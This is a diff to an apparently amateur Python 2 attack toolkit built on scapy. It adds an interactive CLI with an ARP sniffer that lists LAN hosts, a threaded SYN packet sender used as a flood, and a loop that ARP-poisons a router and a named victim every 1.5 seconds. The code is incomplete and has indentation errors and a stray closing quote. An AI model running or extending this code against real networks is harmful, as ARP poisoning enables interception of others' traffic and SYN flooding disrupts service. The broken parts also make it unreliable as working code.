@@ -1,10 +1,15 @@
+#!/usr/bin/env python
 import socket, random, sys, threading
 import cmd
 import logging
 import string, sys
 from scapy.all import *
+import nmap   
 
 #https://pypi.python.org/pypi/netaddr/ TODO
+#PACKAGES INCLUDE cmd2, python-nmap, nfeque, scapy TODO
+
+clientsList = [ ]
 
 class sendSYN(threading.Thread):
         def __init__(self, targetip, port):
@@ -23,6 +28,17 @@ class sendSYN(threading.Thread):
                 t.flags = 'S'
 
                 send(i/t, verbose=0)
+                
+                
+def arp_monitor_callback(pkt):
+    if ARP in pkt and pkt[ARP].op in (1,2): #who-has or is-at   
+	clients = pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
+	#print "In arp_monitor_callback, clients:", clients
+	clients = clientsList.append(clients)
+	for clients in clientsList:
+	    print "FOR: Length of clientsList:", len(clientsList)
+	    print "FOR In arp_monitor_callback, clients:", clients
+	#return pkt.sprintf("%ARP.hwsrc% %ARP.psrc%")
 
  
 class CLI(cmd.Cmd):
@@ -31,10 +47,20 @@ class CLI(cmd.Cmd):
         cmd.Cmd.__init__(self)
         self.prompt = '> '
 
+
+
+    def do_clientlist(self, arg):
+	"""Takes no arguments.
+	    Prints list of clientsList and MAC and IP addresses
+	    on LAN"""
+	print "Length of clientsList: ", len(clientsList)
+	for x in clientsList:
+	    print x
+
     def do_clients(self, arg):
-	""" clients [IP] [range]
+	""" clients 
 	View clients connected to router
-	clients 192.168.1.1 24 """
+	clients """
 
 	#Ping scan network as background job
 	#if we get a reply:
@@ -42,27 +68,25 @@ class CLI(cmd.Cmd):
 
 	#Same command as: nmap -sP 192.168.1.1/24
 	
-	iplist = arg.split(" ")
-	routerip = iplist[0]	
-	iprange = int(iplist[1])	
+
+	sniff(prn=arp_monitor_callback, filter="arp", store=0)  
+
+	#For user input
+#	iplist = arg.split(" ")
+#	routerip = iplist[0]	
+#	iprange = int(iplist[1])	
 
 #http://pastebin.com/xHZZ6Km2
 #http://pythonicprose.blogspot.com/2009/07/python-ping-one-or-many-addresses-at.html
 #https://pypi.python.org/pypi/python-nmap
-	
-	TIMEOUT = 1
-	conf.verb = 0
-	for ip in range(0, 256):
-	    packet = IP(dst="192.168.1." + str(ip), ttl=20)/ICMP()
-	    reply = sr1(packet, timeout=TIMEOUT)
-	    if not (reply is None):
-		print reply.dst, "is online"
-	    else:
-	    print "Timeout waiting for %s" % packet[IP].dst
-
     
     def do_arp(self, arg):
 	"""arp [routerIP] [victimIP] [routerMAC] [victimMAC]"""
+
+	
+#	while 1:
+#	    poison(routerIP, victimIP, routerMAC, victimMAC)
+#	    time.sleep(1.5)
 	
 	
     def do_ip(self, arg):
@@ -109,9 +133,6 @@ class CLI(cmd.Cmd):
 		total += 1
 		sys.stdout.write("\rTotal packets sent:\t\t\t%i" % total)
 	
-    def help_hello(self):
-        print "syntax: hello [message]",
-        print "-- prints a hello message"
 
     def do_quit(self, arg):
         sys.exit(1)
@@ -122,6 +143,8 @@ class CLI(cmd.Cmd):
 
     # shortcuts
     do_q = do_quit
+    do_c = do_clients
+    do_cl = do_clientlist
 
 if __name__ == '__main__':
 
@@ -178,4 +201,4 @@ def main(args):
     while 1:
         poison(routerIP, victimIP, routerMAC, victimMAC)
         time.sleep(1.5)
-main(parse_args())
+main(parse_args())'''
